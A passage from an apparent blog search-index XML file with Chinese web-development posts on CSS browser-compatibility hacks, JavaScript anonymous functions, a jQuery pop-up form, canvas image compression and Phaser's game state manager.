{list-style:none;margin:0px;padding:0px;}9、显示类（display:block,inline）1. display:block,inline两个元素display:block; //可以为内嵌元素模拟为块元素display:inline; //实现同一行排列的的效果display:table; //for FF,模拟table的效果display:block 块元素，元素的特点是：总是在新行上开始；高度，行高以及顶和底边距都可控制；宽度缺省是它的容器的100%，除非设定一个宽度&lt;div&gt;，&lt;p&gt;，&lt;h1&gt;，&lt;form&gt;，&lt;ul&gt; 和 &lt;li&gt; 是块元素的例子display:inline就是将元素显示为行内元素，元素的特点是：和其他元素都在一行上；高，行高及顶和底边距不可改变；宽度就是它的文字或图片的宽度，不可改变。&lt;span&gt;，&lt;a&gt;，&lt;label&gt;，&lt;input&gt;，&lt;img&gt;，&lt;strong&gt; 和 &lt;em&gt; 是 inline 元素的例子2.鼠标手指状显示全部用标准的写法 cursor: pointer;10、背景、图片类1. background显示问题全部注意补齐 width，height 属性2.背景透明问题IE: filter: progid: DXImageTransform.Microsoft.Alpha(style=0,opacity=60);IE: filter: alpha(opacity=10);FF: opacity:0.6;FF: -moz-opacity:0.10;最好两个都写，并将opacity属性放在下面11、min-height最小高度的实现（兼容IE6、IE7、FF）作用是：当容器的内容较少时，能保持一个最小的高度，以免破坏了布局或UI设计效果。而当容器内的内容增加的时候，容器能够自动的伸展以适应内容的变化。1234567#mrjin &#123;background:#ccc;min-height:100px;height:auto !important;height:100px;overflow:visible;&#125;12、著名的 Meyer Reset（重置）1234567891011121314151617181920212223242526272829303132333435363738html, body, div, span, applet, object, iframe,h1, h2, h3, h4, h5, h6，p, blockquote, pre,a, abbr, acronym, address, big, cite, code,del, dfn, em, font, img, ins, kbd, q, s, samp,small, strike, strong, sub, sup, tt, var,dl, dt, dd, ol, ul, li,fieldset, form, label, legend,table, caption, tbody, tfoot, thead, tr, th, td&#123;margin: 0;padding: 0;border: 0;outline: 0;font-weight: inherit;font-style: inherit;font-size: 100%;font-family: inherit;vertical-align: baseline;&#125;:focus &#123;outline: 0;&#125;body &#123;line-height: 1;color: black;background: white;&#125;ol, ul &#123;list-style: none;&#125;table &#123;border-collapse: separate;border-spacing: 0;&#125;caption, th, td &#123;text-align: left;font-weight: normal;&#125;blockquote:before, blockquote:after,q:before, q:after &#123;content: "";&#125;blockquote, q &#123;quotes: "" "";&#125;13、跨浏览器的CSS透明度123456.transparent &#123;opacity: 0.7;-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=70)";filter: alpha(opacity=70);-moz-opacity: 0.7;-khtml-opacity: 0.7;&#125;14、文字阴影（CSS3）1.text &#123; text-shadow: 1px 1px 1px #666; filter: Shadow(Color=#666666, Direction=135, Strength=5); &#125;15、Box阴影(CSS3)&#123; box-shadow: 5px 5px 5px #666; -moz-box-shadow: 5px 5px 5px #666; -webkit-box-shadow: 5px 5px 5px #666; &#125;```123456**16、Sticky Footer (让页脚永远停靠在页面底部，而不是根据绝对位置)**```html&lt;div id=&quot;wrap&quot;&gt;&lt;div id=&quot;main&quot; class=&quot;clearfix&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;footer&quot;&gt; &lt;/div&gt;CSS:1234567891011121314151617* &#123; margin:0; padding:0; &#125;html, body, #wrap &#123; height: 100%; &#125;body &gt; #wrap &#123;height: auto; min-height: 100%;&#125;#main &#123; padding-bottom: 150px; &#125;#footer &#123;position: relative;margin-top: -150px;height: 150px;clear:both;&#125;.clearfix:after &#123;content: ".";display: block;height: 0;clear: both;visibility: hidden;&#125;.clearfix &#123;display: inline-block;&#125;* html .clearfix &#123; height: 1%;&#125;.clearfix &#123;display: block;&#125;17、iframe元素內嵌頁面如何去掉继承的html及body背景色/背景图片iframe元素的功能是在一个文档里内嵌一个文档，创建一个浮动的帧。内嵌文档时一个完整的页面，有HTML,BODY等属性。这样遇到了一个问题，如果样式表中对BODY定义过背景色/背景图片，那么内嵌文档将全部继承过来。所以如何去掉背景色和背景图片：【1】去掉背景色：filter:Chroma(Color=white);举例：1&lt;iframe width="100%" height="400" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" leftmargin="0" topmargin="0" style="filter:Chroma(Color=white);" &gt;&lt;/iframe&gt;【2】去掉背景图片：举例：1&lt;iframe width="100%" height="400" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" leftmargin="0" topmargin="0" style="filter:Chroma(Color=white);" allowTransparency="true" &gt;&lt;/iframe&gt;注意：内嵌页面同时也要增加BODY属性：1&lt;body bgcolor="transparent" style='background:transparent'&gt;18、为什么web标准中无法设置IE浏览器滚动条颜色了？原来样式设置：123456789body&#123;scrollbar-face-color:#f6f6f6;scrollbar-highlight-color:#fff;scrollbar-shadow-color:#eeeeee;scrollbar-3dlight-color:#eeeeee;scrollbar-arrow-color:#000;scrollbar-track-color:#fff;scrollbar-darkshadow-color:#fff;&#125;解决办法是将body换成html。19、为什么中火狐浏览器下文本无法撑开容器的高度？标准浏览器中固定高度值的容器是不会象IE6里那样被撑开的,那我又想固定高度，又想能被撑开需要怎样设置呢？办法就是去掉height设置min-height:200px; 这里为了照顾不认识min-height的IE6 可以这样定义：1div &#123; height:auto!important; height:200px; min-height:200px; &#125;20、如何定义1px左右高度的容器？IE6下这个问题是因为默认的行高造成的，解决的方法也有很多，例如：overflow:hidden | zoom:0.08 | line-height:1px21、怎么样才能让层显示在FLASH之上呢？解决的办法是给FLASH设置透明:123&lt;a href="http://www.chinaz.com/"&gt;:&lt;/a&gt;&lt;pre lang="html" line="1"&gt;&lt;param name="wmode" value="transparent" /&gt;22、怎样使一个div层居中于浏览器中？12345678910111213&lt;style type="text/css"&gt;&lt;!--div &#123;position:absolute;top:50%;left:50%;margin:-100px 0 0 -100px;width:200px;height:200px;border:1px solid red;&#125;--&gt;&lt;/style&gt;23、怎样使div背景透明？首先，需要这两个层都是兄弟关系，其次，这两个层都需要绝对定位。举个例子：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;meta name="author" content="colinivy" /&gt;&lt;title&gt; Colinivy's world&lt;/title&gt;&lt;style type="text/css"&gt;body &#123;font:normal 12px/30px Verdana; &#125;#test &#123;position:relative;width:400px;height:50px;&#125;#inner &#123;z-index:2;position:absolute;top:10px;left:10px;width:380px;height:30px;color:#003;font-weight:bold;text-align:center;&#125;#transbox &#123;z-index:1;position:absolute;top:0px;left:0px;width:400px;height:50px;background:#eef;border:1px solid #a00;filter:alpha(opacity=40);-moz-opacity:0.4;opacity:0.4;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="test"&gt;&lt;div&gt;&lt;p&gt;这里很多的文字,这里很多的文字,这里很多的文字,这里很多的文字,&lt;/p&gt;&lt;/div&gt;&lt;div id="transbox"&gt;&lt;/div&gt;&lt;div id="inner"&gt;BlueIdea,BlueIdea,BlueIdea&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;24、怎样去掉选中时的虚线框？利用onfocus=”this.blur();”例如：&lt;a href=&quot;#&quot; onfocus=&quot;this.blur();&quot;&gt;测试&lt;/a&gt;25、ie6下png背景显示问题？针对ie6下png背景显示问题,CSS中可以这样解决:_background:none;_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod=crop, src=’http://www.0351zhuangxiu.com/uploads/images/bj.jpg’);26、文字与表单对齐方法？设置表单元素第一字体为Tahoma(Verdana系列也可),并设置vertical-align:middle.建设大家把这个约定写入CSS RESET中,能减小很多麻烦:body,button,input,select,textarea{font:12px/1.5 tahoma,arial,sans-serif; vertical-align:middle}27、optgroup标签的用法？optgroup标签,鲜为人知,它对提升选择表单用户体验很有帮助。就是可以在有很多选项时,对这些选项分组：例子：12345678910&lt;select id="selectId"&gt;&lt;optgroup label="GROUP ONE"&gt;&lt;option value="1"&gt;one select&lt;/option&gt;&lt;option value="2"&gt;two select&lt;/option&gt;&lt;/optgroup&gt;&lt;optgroup label="GROUP TWO"&gt;&lt;option value="3"&gt;three select&lt;/option&gt;&lt;option value="4"&gt;four select&lt;/option&gt;&lt;/optgroup&gt;&lt;/select&gt;28、文字与图片垂直居中对齐方法？为图片与文字的共同父元素所有的后代元素定义*{vertical-align:middle};例如:我要的坚强只需定义p*{vertical-align:middle}即可使文字与图片同行垂直居中.29、文章标题列表中日期居右显示的两种方法？方法A相对方法B省资源,但比方法B要多写两句代码,使用时请视情况而定:方法A：&lt;p&gt;这是文章标题&lt;span&gt;2010-10-10&lt;/span&gt;&lt;/p&gt;然后定义p和span的样式：12p&#123; position:relative&#125;p span&#123; position:absolute; right:0&#125;方法B:&lt;p&gt;&lt;span&gt;2010-10-10&lt;/span&gt;这是文章标题&lt;/p&gt;然后定义span右浮动:1p span&#123;float:right&#125;30、ie6下max/min-width/height实现？ie6下max/min-width/height实现,_width: expression_r(this.width &gt;600 ? “600px” : true);,height同理.31、空白外边距互相叠加的问题？一般通过添加透明边框或者1px的内边距避免；其一,为外围元素定义透明边框.具体到本例,即在样式div中加入border:1px solid transparent;其二,为外围元素定义内边距填充..具体到本例,即在样式div中加入padding:1px；例如：123456789101112131415&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;空白边距叠加demo@Mr.Think&lt;/title&gt;&lt;style&gt;body&#123;width:300px; font-family:'微软雅黑'; font-size:1em; text-indent:10px; line-height:1.25&#125;div&#123;background:#a40000;margin:10px&#125;div p&#123;background:#eee;margin:15px&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;p&gt;空白边距叠加demo@Mr.Think&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;32、网页设计中的默认字体font: 12px/1.5 Tahoma, Helvetica, Arial, sans-serif;说明：line-height采用1.5, 也就是18px. 这是淘宝视觉规范中定义的行高，对于12px字体，这个行高看起来很舒服。font-family默认采用Tahoma. Tahoma是英文Windows操作系统的默认字体，这个字体比较均衡，显示中英文混排很不错，是经久耐看的一款字体。33、浏览器兼容——常用的css hack（1）123.title&#123; height:200px;*height:200px;_height:200px; &#125;（2）123.title&#123; height:200px;*height:200px !important;*height:200px; &#125;（3）123.title&#123; height:200px; &#125;*html.title&#123; height:200px;&#125;*+html.title&#123; height:200px;&#125;&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>css兼容</tag>
        <tag>web前端css兼容性</tag>
        <tag>web前端兼容性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[剖析Javascript匿名函数]]></title>
    <url>%2F2015%2F08%2F31%2F%E5%89%96%E6%9E%90javascript%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[一、什么是匿名函数？在Javascript定义一个函数一般有如下三种方式：1、函数关键字(function)语句：fnMethodName(x)&#123;alert(x);&#125;```1232、函数字面量(Function Literals)：```javascriptvar fnMethodName = function(x)&#123;alert(x);&#125;3、Function()构造函数：fnMethodName = new Function(‘x’,'alert(x);’)```12345678910上面三种方法定义了同一个方法函数fnMethodName，第1种就是最常用的方法，后两种都是把一个函数复制给变量fnMethodName，而这个函数是没有名字的，即匿名函数。实际上，相当多的语言都有匿名函数。## **二、函数字面量和Function()构造函数的区别**1、虽然函数字面量是一个匿名函数，但语法允许为其指定任意一个函数名，当写递归函数时可以调用它自己，使用Function()构造函数则不行。```javascriptvar f = function fact(x) &#123;if (x &lt; = 1) return 1;else return x*fact(x-1);&#125;;2、Function()构造函数允许运行时Javascript代码动态的创建和编译。在这个方式上它类似全局函数eval()。3、Function()构造函数每次执行时都解析函数主体，并创建一个新的函数对象。所以当在一个循环或者频繁执行的函数中调用Function()构造函数的效率是非常低的。相反，函数字面量却不是每次遇到都重新编译的。4、用Function()构造函数创建一个函数时并不遵循典型的作用域，它一直把它当作是顶级函数来执行。123456var y = “global”;function constructFunction() &#123;var y = “local”;return new Function(“return y”); // 无法获取局部变量&#125;alert(constructFunction()()); // 输出 “global”和函数关键字定义相比Function()构造器有自己的特点且要难以使用的多，所以这项技术通常很少使用。而函数字面量表达式和函数关键字定义非常接近。考虑前面的区别，虽然有消息说字面量的匿名函数在OSX 10.4.3下的某些webkit的引擎下有bug，但我们平常所说的匿名函数均指采用函数字面量形式的匿名函数。三、匿名函数的代码模式昨天hedger wang在他的blog介绍了几种匿名函数的代码模式：错误模式：其无法工作，浏览器会报语法错。123function()&#123;alert(1);&#125;();1、函数字面量：首先声明一个函数对象，然后执行它。123(function()&#123;alert(1);&#125; ) ( );2、优先表达式：由于Javascript执行表达式是从圆括号里面到外面，所以可以用圆括号强制执行声明的函数。123( function()&#123;alert(2);&#125; ( ) );3、Void操作符：用void操作符去执行一个没有用圆括号包围的一个单独操作数。123void function()&#123;alert(3);&#125;()这三种方式是等同的，hedger wang因为个人原因比较喜欢第3种，而在实际应用中我看到的和使用的都是第1种。四、匿名函数的应用1、《Javascript的一种模块模式》中的第一句话就是“全局变量是魔鬼”。配合var关键字，匿名函数可以有效的保证在页面上写入Javascript，而不会造成全局变量的污染。这在给一个不是很熟悉的页面增加Javascript时非常有效，也很优美。实际上，YUI以及其相应的范例中大量使用匿名函数，其他的Javascript库中也不乏大量使用。2、Javascript的函数式编程(functional programming)的基石。具体请看《用函数式编程技术编写优美的JavaScript》和《函数式JavaScript编程指南》。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js匿名函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery+CSS3实现点击动画弹出表单代码]]></title>
    <url>%2F2015%2F08%2F31%2Fjquerycss3%E5%AE%9E%E7%8E%B0%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB%E5%BC%B9%E5%87%BA%E8%A1%A8%E5%8D%95%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[分享一款基于jQuery+CSS3点击动画弹出表单代码是一款鼠标点击图标按钮动画弹出表单特效代码。效果图如下：实现的代码。html代码：12345678910111213141516171819202122232425&lt;div class="buttonCollection"&gt;&lt;div class="qutton" id="qutton_upload"&gt;&lt;div class="qutton_dialog" id="uploadDialog"&gt;&lt;h2&gt;上传&lt;/h2&gt;&lt;div class="urlField"&gt;&lt;input type="text" id="fileUrl" placeholder="文件地址" /&gt;&lt;/div&gt;&lt;div id="button_basic_upload"&gt;选择文件&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="qutton" id="qutton_delete"&gt;&lt;div class="qutton_dialog" id="deleteDialog"&gt;&lt;h2&gt;确定？&lt;/h2&gt;&lt;div id="button_basic_confirm_delete"&gt;确定删除&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="qutton" id="qutton_comment"&gt;&lt;div class="qutton_dialog" id="commentDialog"&gt;&lt;textarea name="comment" id="commentInput" placeholder="你的评论..."&gt;&lt;/textarea&gt;&lt;div id="button_basic_submit_comment"&gt;发送&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;js代码：12345678910111213141516171819$(function () &#123; var quttonUpload = Qutton.getInstance($('#qutton_upload')); quttonUpload.init(&#123; icon: 'images/icon_upload.png', backgroundColor: '#917466' &#125;); var quttonDelete = Qutton.getInstance($('#qutton_delete')); quttonDelete.init(&#123; icon: 'images/icon_delete.png', backgroundColor: "#eb1220" &#125;); var quttonComment = Qutton.getInstance($('#qutton_comment')); quttonComment.init(&#123; icon: 'images/icon_comment.png', backgroundColor: "#41aaf1" &#125;);&#125;);查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq+css3 弹出表单</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS图片压缩（pc端和移动端都适用）]]></title>
    <url>%2F2015%2F08%2F31%2Fjs%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9%EF%BC%88pc%E7%AB%AF%E5%92%8C%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%83%BD%E9%80%82%E7%94%A8%EF%BC%89%2F</url>
    <content type="text"><![CDATA[最近在做移动端遇到了一个问题就是：手机拍照后，图片过大如果上传到服务器务必会浪费带宽，最重要的是流量啊别慌，好事儿来了，务必就会有人去研究研究图片的压缩：鄙人结合前人的经验，结合自己实战，总结出一个方法供大家参考:123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * 图片压缩，默认同比例压缩 * @param &#123;Object&#125; path * pc端传入的路径可以为相对路径，但是在移动端上必须传入的路径是照相图片储存的绝对路径 * @param &#123;Object&#125; obj * obj 对象 有 width， height， quality(0-1) * @param &#123;Object&#125; callback * 回调函数有一个参数，base64的字符串数据 */function dealImage(path, obj, callback)&#123; var img = new Image(); img.src = path; img.onload = function()&#123; var that = this; // 默认按比例压缩 var w = that.width, h = that.height, scale = w / h; w = obj.width || w; h = obj.height || (w / scale); var quality = 0.7; // 默认图片质量为0.7 //生成canvas var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); // 创建属性节点 var anw = document.createAttribute("width"); anw.nodeValue = w; var anh = document.createAttribute("height"); anh.nodeValue = h; canvas.setAttributeNode(anw); canvas.setAttributeNode(anh); ctx.drawImage(that, 0, 0, w, h); // 图像质量 if(obj.quality &amp;&amp; obj.quality &lt;= 1 &amp;&amp; obj.quality &gt; 0)&#123; quality = obj.quality; &#125; // quality值越小，所绘制出的图像越模糊 var base64 = canvas.toDataURL('image/jpeg', quality ); // 回调函数返回base64的值 callback(base64); &#125;&#125;当然返回的是一个base64的一个字符串；如果可以试着测试一下压缩后的图片大小：123456789// 调用函数处理图片 dealImage("路径", &#123;// 注意：在pc端可以用绝对路径或相对路径，移动端最好用绝对路径（因为用take photo后的图片路径，我没有试成功（如果有人试成功了可以分享一下经验）） width : 200&#125;, function(base)&#123;//直接将获取到的base64的字符串，放到一个image标签中就可看到测试后的压缩之后的样式图了 document.getElementById("transform").src = base; console.log("压缩后：" + base.length / 1024 + " " + base); &#125;)PS：主要思想就是获取到图片，利用H5 canvas技术进行图片数据化为 base64 的字符串，最后传到后台进行，后台将base64的字符串数据进行图像化储存。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js图片压缩</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入分析详解Phaser状态管理(StateManager)]]></title>
    <url>%2F2015%2F08%2F29%2F%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E8%AF%A6%E8%A7%A3phaser%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86statemanager%2F</url>
    <content type="text"><![CDATA[当我们在玩一个简单的网页游戏的时候，其流程通常会包含以下步骤：1、 出现一个载入进度条，载入一些必须的图片、音频、字体等文件；2、 显示主菜单，提示用户开始游戏；3、 进入游戏主逻辑。在游戏过程中，当用户胜利或者失败，或是触发了某个按钮或者按键时，游戏会退出，显示主菜单。&emsp;&emsp;上面所述的每一个步骤，在 Phaser 中都可以用一个状态（State）来表示。因此上面的三个状态可概括为：1、 加载资源2、 显示主菜单，需监听并响应用户输入3、 进入游戏逻辑，需监听并响应用户输入&nbsp;这三个状态可以进一步抽象为：1、 加载资源2、 创建主菜单界面元素（精灵、文字、图片等）、根据一定的规则和用户输入渲染界面3、 创建主游戏界面元素（精灵、文字、图片等）、根据一定的规则和用户输入渲染界面&nbsp;&emsp;&emsp;这里出现个问题，在第一步加载资源中显示的进度条的资源是怎么来的呢？所以，我们需要加一个“游戏启动”这个状态，用于游戏最基本的一些变量的初始化，以及载入进度条的加载。最终的状态变为：1、 加载资源（进度条素材）2、 加载资源（游戏必要的其他素材）3、 创建主菜单界面元素（精灵、文字、图片等）、根据用户输入和一定的规则渲染界面4、 创建主游戏界面元素（精灵、文字、图片等）、根据用户输入和一定的规则渲染界面&nbsp;&emsp;&emsp;在这四个状态中，我们发现一个相同的部分：加载资源、创建游戏元素、根据用户输入和游戏规则渲染界面。在Phaser中，分别用这三个函数来表示：preload、create、update，也就是说，在一个State中，必须要包含preload、create、update三者中的一个或多个，这样才能构成一个完整的状态。实际上，在Phaser中还有render这个函数。Render用于渲染界面，是在游戏和插件的渲染之后再执行渲染，通常被用作后处理。Render这个函数平时用的很少，一般用于添加debug信息。状态已经定义好了，那如何对这些状态进行排序并顺序调用呢，在Phaser中，我们用状态管理器（StateManager）来管理状态。状态管理器包含了两个最常用函数add(key,state)和start(key)，分别用于添加状态和启动状态。其中，参数key表示对应于状态state的键值，key与state需一一对应，这样，以后需要对某个状态进行操作时，只需要对key进行操作即可。&nbsp;下面的框图展示了上面总结的四个状态与状态管理器的关系：&emsp;&emsp;我们将四个状态分别命名为Boot，Preload，MainMenu，Game。其中，MainMenu和Game之间可相互跳转，当用户在主菜单界面上点击进入游戏，则进入 Game；当用户在游戏过程中胜利、失败或者按了某个按键，则退回到主菜单。&nbsp;下面是源代码：12345678910111213141516window.onload = function() &#123;//创建 Phaser 游戏，并注入到 gmeContainer 这个 div 容器中var game = new Phaser.Game(800, 600, Phaser.AUTO, 'container');//添加四个的状态。game.state 是 Game 内部维护的一个 StateManagergame.state.add('Boot', BasicGame.Boot);game.state.add('Preloader', BasicGame.Preloader);game.state.add('MainMenu', BasicGame.MainMenu);game.state.add('Game', BasicGame.Game);//启动 Boot 状态game.state.start('Boot');&#125;;var BasicGame = &#123;&#125;;下面是四个状态的定义。第一个状态：12345678910111213141516171819202122232425262728293031323334BasicGame.Boot = function(game) &#123;&#125;;BasicGame.Boot.prototype = &#123;init: function() &#123;//如果你很明确的知道你的游戏需要支持多点触摸，你可以把这个设置为 1this.input.maxPointers = 1;if (this.game.device.desktop) &#123;//如果你有一些特殊的桌面相关的设置，你可以放在这里&#125; else &#123;//移动设备相关的设置//在这里我们定义了：“缩放游戏，不小于 480x260, 不超过 1024x768”this.scale.scaleMode = Phaser.ScaleManager.SHOW_ALL;this.scale.setMinMax(480, 260, 1024, 768);this.scale.forceLandscape = true;&#125;this.scale.pageAlignHorizontally = true;this.scale.pageAlignVertically = true;&#125;,preload: function() &#123;//在这里，我们载入了 preloader 所需的资源（一个载入进度条）this.load.image('preloaderBar', 'assets/preloader-bar.png');&#125;,create: function() &#123;//当游戏把 preloader 相关资源载入缓存，进入真正的 preloaderthis.state.start('Preloader');&#125;&#125;;&nbsp;第二个状态：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849BasicGame.Preloader = function(game) &#123;this.background = null;this.preloadBar = null;&#125;;BasicGame.Preloader.prototype = &#123;preload: function() &#123;//添加载入进度条this.stage.backgroundColor = '#2d2d2d';this.preloadBar = this.add.sprite(this.game.width / 2 - 100, this.game.height / 2,'preloaderBar');this.add.text(this.game.width / 2, this.game.height / 2 - 30, "Loading...", &#123;font: "32px monospace",fill:"#fff"&#125;).anchor.setTo(0.5, 0.5);//这里把 preloadBar 精灵设置为一个载入器精灵。当文件在载入时，他会自动从0 到全长进行裁剪长度this.load.setPreloadSprite(this.preloadBar);//开始加载游戏所需的剩下的精灵、图片、精灵表、音频文件等this.load.image('titlepage', 'assets/titlepage.png');this.load.image('bullet', 'assets/bullet.png');this.load.spritesheet('enemy', 'assets/enemy.png', 32, 32);this.load.audio('explosion', ['assets/explosion.ogg', 'assets/explosion.wav']);this.load.audio('playerExplosion', ['assets/player-explosion.ogg','assets/player-explosion.wav']);&#125;,create: function() &#123;//当加载完成后，禁止裁剪载入条，因为在音乐解码之后，将进入 update 循环this.preloadBar.cropEnabled = false;&#125;,update: function() &#123;//这样能提供一个更好的游戏体验//它会在进入 MainMenu 前等待我们的音频文件解码完毕//如果你直接跳到主菜单，音乐仍然可以播放，但是会有几秒钟的延迟，因为这个时候 mp3 正在解码//所以，如果你需要音乐与菜单同步，最好就在这里等待解码结束//如果游戏中没有音乐文件，可以把 game.state.start 这一行代码放到 create 函数中，并完全删除 update 这个函数。if (this.cache.isSoundDecoded('titleMusic') &amp;amp;&amp;amp; this.ready == false)&#123;this.ready = true;//进入 MainMenu 状态this.state.start('MainMenu');&#125;&#125;&#125;;&nbsp;第三个状态：12345678910111213141516171819202122232425262728293031323334353637383940414243BasicGame.MainMenu = function (game) &#123;this.music = null;this.playButton = null;&#125;;BasicGame.MainMenu.prototype = &#123;create: function () &#123;//我们已经把所有资源都加载进来了，所以，现在可以进入主菜单//在这里，我们将播放一段音乐，添加一张图片和一个按钮this.add.sprite(0, 0, 'titlepage');this.loadingText = this.add.text(this.game.width / 2, this.game.height / 2 + 80, "Press Z or tap/click game to start", &#123; font: "20px monospace", fill: "#fff" &#125;);this.loadingText.anchor.setTo(0.5, 0.5);this.add.text(this.game.width / 2, this.game.height - 90, "image assets Copyright (c) 2002 AriFeldman", &#123;font:"12px monospace", fill: "#fff", align: "center"&#125;).anchor.setTo(0.5, 0.5);this.add.text(this.game.width / 2, this.game.height - 75, "sound assets Copyright (c) 2012 -2013 Devin Watson", &#123;font: "12px monospace", fill: "#fff", align: "center"&#125;).anchor.setTo(0.5, 0.5);&#125;,update: function () &#123;if (this.input.keyboard.isDown(Phaser.Keyboard.Z) || this.input.activePointer.isDown) &#123;this.startGame();&#125;//在这里可以做一些漂亮的主菜单效果&#125;,startGame: function (pointer) &#123;//开始按钮已经被点击或者触摸了，停止音乐播放this.music.stop();//进入真正的游戏this.state.start('Game');&#125;&#125;;&nbsp;第四个状态：123456789101112131415161718192021222324252627282930313233343536373839404142434445BasicGame.Game = function(game) &#123;&#125;;BasicGame.Game.prototype = &#123;create: function() &#123;// 创建游戏背景、玩家、敌人、子弹、文字、音频等，并启动监听键盘输入this.setupBackground();this.setupPlayer();this.setupEnemies();this.setupBullets();this.setupText();this.setupAudio();this.cursors = this.input.keyboard.createCursorKeys();&#125;,update: function() &#123;// 检测碰撞、生成敌人、开火、响应玩家输入，任何东西都可以放在这里this.checkCollisions();this.spawnEnemies();this.enemyFire();this.processPlayerInput();if(…) &#123;quitGame(); &#125;&#125;quitGame: function(pointer) &#123;// 在这里，你应该销毁你不再需要的东西：停止播放音乐、删除精灵、清空缓存、释放资源等等this.player.destroy();this.enemyPool.destroy();this.bulletPool.destroy();this.shooterPool.destroy();this.scoreText.destroy();this.returnText.destroy();// 然后，回到主菜单this.state.start('MainMenu');&#125;&#125;下面我们来看下 Phaser.js 中是如何对状态进行管理和调用的。Game初始化中，等设备准备好之后执行boot函数：12// core/Game.jsthis.device.whenReady(this.boot, this);Game.boot()中调用包装了浏览器动画绘制方法的 Phaser.RequestAnimationFrame：123// core/Game.jsthis.raf = new Phaser.RequestAnimationFrame(this, false);this.raf.start();Phaser.RequestAnimationFrame.start()中会调用系统函数 window.requestAnimationFrame（需浏览器支持，如果不支持，则改为调用 window.setTimeout）：12345678910111213// system/RequestAnimationFrame.jsstart: function () &#123;…this._timeOutID = window.requestAnimationFrame(this._onLoop);….&#125;//让浏览器不停地调用 this._onLoop，进而调用 this.game.update()Phaser.RequestAnimationFrame._onLoop = function() &#123;……this.game.update(Math.floor(rafTime));this._timeOutID = window.requestAnimationFrame(this._onLoop);……&#125;在 Game.update 中调用了 updateLogic，在 updateLogic 中会对缩放、调试、世界、物理引擎、转改、插件、舞台进行更新：12345678910111213141516171819202122232425262728293031323334// core/Game.jsGame.update(time) &#123;……updateLogic(timeStep);……&#125;Game.updateLogic(timeStep) &#123;……this.scale.preUpdate();this.debug.preUpdate();this.world.camera.preUpdate();this.physics.preUpdate();// 在这个函数中将获取待执行的状态，即用户调用了 Phaser.StateManager.start(key)时，key对应的状态。// 然后调用状态的 preload 和 create 方法this.state.preUpdate(timeStep);this.plugins.preUpdate(timeStep);this.stage.preUpdate();//这里会调用状态的 update 方法this.state.update();this.stage.update();this.tweens.update(timeStep);this.sound.update();this.input.update();this.physics.update();this.particles.update();this.plugins.update();this.stage.postUpdate();this.plugins.postUpdate();…… &#125;&emsp;&emsp;这里只是对一个简单游戏的状态管理进行分析，我们还可以这个演示程序进行优化，例如在游戏启动时只加载主菜单所需的资源，以提高游戏启动的速度。然后在每进入一关时，加载这一关所必须的资源。这样能更好的改善用户体验。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser StateManger</tag>
        <tag>phaser状态管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser新手教程：开发”怪物要糖果“游戏]]></title>
    <url>%2F2015%2F08%2F29%2Fphaser%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%80%AA%E7%89%A9%E8%A6%81%E7%B3%96%E6%9E%9Cdemo%2F</url>
